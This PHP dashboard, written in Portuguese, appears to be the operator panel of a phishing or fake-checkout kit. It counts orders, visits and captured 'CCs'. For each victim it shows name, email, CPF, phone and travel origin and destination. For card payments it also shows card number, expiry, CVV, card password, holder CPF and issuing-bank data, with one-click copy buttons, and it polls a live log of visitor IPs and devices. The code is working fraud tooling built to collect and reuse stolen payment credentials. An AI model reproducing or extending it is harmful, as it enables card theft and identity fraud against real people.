<?php
require_once "include/header.php";

$PDO = db_connect();
$sql_count_vendas = "SELECT COUNT(*) AS total FROM vendas ORDER BY id ASC";
$stmt_count_vendas = $PDO->prepare($sql_count_vendas);
$stmt_count_vendas->execute();
$total_vendas = $stmt_count_vendas->fetchColumn();

$sql_count_acessos = "SELECT COUNT(*) AS total FROM acessos ORDER BY id ASC";
$stmt_count_acessos = $PDO->prepare($sql_count_acessos);
$stmt_count_acessos->execute();
$total_acessos = $stmt_count_acessos->fetchColumn();

$sql_count_cc = "SELECT count(*) as total FROM vendas WHERE tipoPagamento='CC'";
$stmt_count_cc = $PDO->prepare($sql_count_cc);
$stmt_count_cc->execute();
$total_cc = $stmt_count_cc->fetchColumn();

$sql_count_pix = "SELECT count(*) as total FROM vendas WHERE tipoPagamento='PIX'";
$stmt_count_pix = $PDO->prepare($sql_count_pix);
$stmt_count_pix->execute();
$total_pix = $stmt_count_pix->fetchColumn();

$sql1 = "SELECT * FROM vendas";
$stmt1 = $PDO->prepare($sql1);
$stmt1->execute();
?>
<style>
  #mkModalPedido .modal-body .form-group {
    margin-bottom: 0 !important;
  }

  .form-control {
    cursor: pointer !important;
  }

  .card-body i {
    cursor: pointer;
  }
</style>
<div class="clearfix"></div>
<div class="content-wrapper">
  <div class="container-fluid">
    <div class="card mt-3">
      <div class="card-content">
        <div class="row row-group m-0">
          <div class="col-12 col-lg-6 col-xl-4 border-light">
            <div class="card-body">
              <h5 class="text-white mb-0">
                <?php echo $total_vendas; ?>
                <span class="float-right">
                  <a href="assets/php/mkZeraPedido.php">
                    <i class="fa fa-shopping-cart"></i>
                  </a>
                </span>
              </h5>
              <div class="progress my-3" style="height:3px;">
                <div class="progress-bar" style="width:100%"></div>
              </div>
              <p class="mb-0 text-white small-font">Total pedidos</span></p>
            </div>
          </div>
          <div class="col-12 col-lg-6 col-xl-4 border-light">
            <div class="card-body">
              <h5 class="text-white mb-0">
                <?php echo $total_acessos; ?>
                <span class="float-right">
                  <a href="assets/php/mkZeraVisita.php">
                    <i class="fa fa-eye"></i>
                  </a>
                </span>
              </h5>
              <div class="progress my-3" style="height:3px;">
                <div class="progress-bar" style="width:100%"></div>
              </div>
              <p class="mb-0 text-white small-font">Total visitas</span></p>
            </div>
          </div>
          <div class="col-12 col-lg-6 col-xl-4 border-light">
            <div class="card-body">
              <h5 class="text-white mb-0">
                <?php echo $total_cc; ?>
                <span class="float-right">
                  <i class="zmdi zmdi-card"></i>
                </span>
              </h5>
              <div class="progress my-3" style="height:3px;">
                <div class="progress-bar" style="width:100%"></div>
              </div>
              <p class="mb-0 text-white small-font">Total de CCs</span></p>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-12 col-lg-4 col-xl-4">
        <div class="card">
          <div class="card-header">
            Formas de Pagamento
          </div>
          <div class="card-body">
            <div class="chart-container-2">
              <canvas id="chart2"></canvas>
            </div>
          </div>
          <div class="table-responsive">
            <table class="table align-items-center">
              <tbody>
                <tr>
                  <td><i class="fa fa-circle text-white mr-2"></i> Pedido com CC</td>
                  <td>
                    <?php echo $total_cc; ?>
                  </td>
                </tr>
                <tr>
                  <td><i class="fa fa-circle text-light-1 mr-2"></i>Pedido com Pix</td>
                  <td>
                    <?php echo $total_pix; ?>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
      <div class="col-12 col-lg-8 col-lg-8">
        <div class="card" style="max-height: 369px; height: 369px;">
          <div class="card-header">
            Últimos Acessos
          </div>
          <div class="table-responsive">
            <table id="mkTabelaAcessoIndex" class="table align-items-center table-flush table-borderless text-center">
              <thead>
                <tr>
                  <th>ip</th>
                  <th>estado</th>
                  <th>dispositivo</th>
                  <th>sistema</th>
                  <th>data</th>
                </tr>
              </thead>
              <tbody id="mkCarregaAcessoIndex">
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
    <div class="row">
      <div class="col-12 col-lg-12">
        <div class="card">
          <div class="card-header">
            Últimos pedidos
          </div>
          <div class="table-responsive">
            <table class="table align-items-center table-flush table-borderless text-center">
              <thead>
                <tr>
                  <th>Nome</th>
                  <th>localizacao</th>
                  <th>valor</th>
                  <th>Forma de Pagamento</th>
                  <th>Clique copia Pix</th>
                  <th>Data</th>
                  <th>ação</th>
                </tr>
              </thead>
              <tbody>
                <?php while ($venda = $stmt1->fetch(PDO::FETCH_ASSOC)): ?>
                  <tr>
                    <td>
                      <?php echo $venda['nome'] ?>
                    </td>
                    <td>
                      <?php echo $venda['estado_loca'] ?>, <?php echo $venda['pais_loca'] ?>
                    </td>
                    <td>
                      <?php echo number_format($venda['valorTotal'], 2, ",", ".") ?>
                    </td>
                    <td>
                      <?php echo $venda['tipoPagamento'] ?>
                    </td>
                    <td>
                      <?php echo $venda['clique_copiapix'] ?>
                    </td>
                    <td>
                      <?php echo $venda['data'] ?>
                    </td>
                    <td>
                      <button type="submit" class="btn btn-outline-success p-2" data-toggle="modal"
                        data-target="#mkModalPedido<?php echo $venda['id'] ?>"><i class="icon-eye"></i> Ver</button>
                    </td>
                    <div class="modal fade" id="mkModalPedido<?php echo $venda['id'] ?>" tabindex="-1" role="dialog"
                      aria-labelledby="myExtraLargeModalLabel" aria-hidden="true">
                      <div class="modal-dialog modal-xl">
                        <div class="modal-content">
                          <div class="modal-header">
                            <h5 class="modal-title" id="exampleModalLabel">ORIGEM / DESTINO: <?php echo $venda['origem'] ?> -> <?php echo $venda['destino'] ?>
                            </h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                              <span aria-hidden="true">&times;</span>
                            </button>
                          </div>
                          <div class="modal-body">
                            <div class="row">
                              <div class="col-md-6">
                                <h4>Dados Pessoais</h4>
                                <div class="row">
                                  <div class="form-group col-md-6">
                                    <label for="pedidoEmail">Email</label>
                                    <a class="form-control" id="pedidoEmail"
                                      onclick="copy(this);return exibirSucessoCopiado();">
                                      <?php echo $venda['email'] ?>
                                    </a>
                                  </div>
                                </div>
                                <div class="form-group">
                                  <label for="pedidoNome">Nome completo</label>
                                  <a class="form-control" id="pedidoNome"
                                    onclick="copy(this);return exibirSucessoCopiado();">
                                    <?php echo $venda['nome'] ?>
                                  </a>
                                </div>
                                <div class="row">
                                  <div class="form-group col-md-6">
                                    <label for="pedidoCpf">CPF</label>
                                    <a class="form-control" id="pedidoCpf"
                                      onclick="copy(this);return exibirSucessoCopiado();">
                                      <?php echo $venda['cpf'] ?>
                                    </a>
                                  </div>
                                  <div class="form-group col-md-6">
                                    <label for="pedidoTelefone">telefone</label>
                                    <a class="form-control" id="pedidoTelefone"
                                      onclick="copy(this);return exibirSucessoCopiado();">
                                      <?php echo $venda['telefone'] ?>
                                    </a>
                                  </div>
                                </div>
                              </div>
                              <div class="col-md-6">
                                <h4>Dados Pagamento</h4>
                                <div class="row">
                                  <div class="form-group col-md-6">
                                    <label for="pedidoEmail">Forma de pagamento</label>
                                    <a class="form-control" id="pedidoEmail"
                                      onclick="copy(this);return exibirSucessoCopiado();">
                                      <?php echo $venda['tipoPagamento'] ?>
                                    </a>
                                  </div>
                                  <div class="form-group col-md-6">
                                    <label for="pedidoEmail">Clique no código PIX</label>
                                    <a class="form-control" id="pedidoEmail"
                                      onclick="copy(this);return exibirSucessoCopiado();">
                                      <?php echo $venda['clique_copiapix'] ?>
                                    </a>
                                  </div>
                                </div>

                                <?php
                                if ($venda['tipoPagamento'] == "CC") {
                                  echo "
                                  <section id='pagamentoCartao'>
                                  <div class='form-group'>
                                    <label for='number'>Número do cartão</label>
                                    <a class='form-control' id='number' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['numerocc'] . "</a>
                                  </div>
                                  <div class='row'>
                                    <div class='form-group col-md-6'>
                                      <label for='expiry'>Validade</label>
                                      <a class='form-control' id='expiry' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['validadecc'] . "</a>
                                    </div>
                                    <div class='form-group col-md-6'>
                                      <label for='cvc'>CVV</label>
                                      <a class='form-control' id='cvc' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['cvvcc'] . "</a>
                                    </div>
                                  </div>
                                  <div class='form-group'>
                                    <label for='number'>Senha do cartão</label>
                                    <a class='form-control' id='number' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['senhacc'] . "</a>
                                  </div>
                                  <div class='form-group'>
                                    <label for='titular_cc'>Titular do cartão</label>
                                    <a class='form-control' id='titular_cc' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['titularcc'] . "</a>
                                  </div>
                                  <div class='form-group'>
                                    <label for='cpf_titular'>CPF do Titular</label>
                                    <a class='form-control' id='cpf_titular' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['cpfcc'] . "</a>
                                  </div>
                                  <div class='form-group'>
                                    <label for='bin'>Bin do cartão:</label>
                                    <a class='form-control' id='bin' onclick='copy(this);return exibirSucessoCopiado();'>" . $venda['banco_cc'] . " - " . $venda['bandeira_cc'] . " " . $venda['categoria_cc'] . " " . $venda['pais_cc'] . "</a>
                                  </div>
                                </section>
                                  ";
                                } else if ($venda['tipoPagamento'] == "PIX") {
                                  echo "
                                  <section id='pagamentoPix' class='mb-4 mt-3'>
                                    <img src='assets/images/logoPix.webp' width='100'>
                                  </section>
                                  ";
                                }
                                ?>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="modal-footer">
                          <button type="button" class="btn btn-danger" data-dismiss="modal">Fechar</button>
                        </div>
                      </div>
                    </div>
                  </tr>
                <?php endwhile; ?>
              </tbody>
          </div>
          </table>
        </div>
      </div>
    </div>
  </div>
  <div class="overlay toggle-menu"></div>
</div>
</div>
<audio id="audio">
		<source src="notifi.mp3" type="audio/mp3">
		Seu navegador não possui suporte ao elemento audio
	</audio>
  
<div aria-live="polite" aria-atomic="true" style="position: relative; min-height: 200px;">
  <div id="mkConfirmCopy" class="toast alert alert-success"
    style="position: fixed; top: 85px; right: 15px;z-index:9999;">
    <div class="toast-body">
      Copiado com sucesso
    </div>
  </div>
</div>
<?php
require_once('include/footer.php');
?>
<script>
  function copy(that) {
    var inp = document.createElement('input');
    document.body.appendChild(inp)
    inp.value = that.textContent
    inp.select();
    document.execCommand('copy', false);
    inp.remove();
  }

  function exibirSucessoCopiado() {
    $('#mkConfirmCopy').toast('show')
    setTimeout(function () { }, 3000);
  }
</script>
<script>
  $(function () {
    "use strict";
    var ctx = document.getElementById("chart2").getContext("2d");
    var myChart = new Chart(ctx, {
      type: "doughnut",
      data: {
        labels: ["cartao", "pix"],
        datasets: [{
          backgroundColor: ["#ffffff", "rgba(255, 255, 255, 0.70)"],
          data: [<?php echo $total_cc; ?>, <?php echo $total_pix; ?>],
          borderWidth: [0, 0, 0, 0],
        },],
      },
      options: {
        maintainAspectRatio: false,
        legend: {
          position: "bottom",
          display: false,
          labels: {
            fontColor: "#ddd",
            boxWidth: 15,
          },
        },
        tooltips: {
          displayColors: false,
        },
      },
    });
  });

  audio = document.getElementById('audio');

  function reproduzir(urlMusica) {
    audio.src = urlMusica;
    audio.play();
  }

  function load_unseen_notification(view = '') {
    $.ajax({
      url: "assets/php/notificacao.php",
      method: "POST",
      data: {
        view: view
      },
      dataType: "json",
      success: function(data) {
        $('.mkNotificacoes').html(data.notification);

        if (data.unseen_notification > 0) {
          $('.count-symbol').css('display', 'block');
          $('.count').html(data.unseen_notification);
          event.preventDefault();
          reproduzir('notifi.mp3');
        }
      }
    });
  }

  $(document).ready(function () {

    load_unseen_notification();

    $(document).on('click', '#navbarDropdownMenuLink', function() {
      $('.count-symbol').css('display', 'none');
      load_unseen_notification('yes');
    });

    $("#mkCarregaAcessoIndex").load("assets/php/mkAcessosIndex.php");

    setInterval(function () {
      // load_unseen_notification();
      $("#mkCarregaAcessoIndex").load("assets/php/mkAcessosIndex.php");
    }, 3000);

  });
</script>